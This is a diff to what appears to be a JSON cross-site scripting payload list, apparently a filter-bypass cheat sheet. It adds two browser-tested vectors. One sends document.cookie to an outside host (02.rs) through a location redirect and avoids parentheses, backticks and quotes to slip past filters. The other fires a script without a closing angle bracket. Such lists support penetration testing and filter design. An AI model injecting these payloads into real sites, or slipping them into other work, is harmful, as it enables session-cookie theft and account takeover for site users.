@@ -130,5 +130,25 @@
             "safari"
         ],
         "hash": "#alert(1)"
+    },
+    {
+        "description": "XSS cookie exfiltration without parentheses, backticks or quotes",
+        "code": "<video><source onerror=location=/\\02.rs/+document.cookie>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "XSS without greater than",
+        "code": "<svg onload=alert(1) ",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
     }
 ]
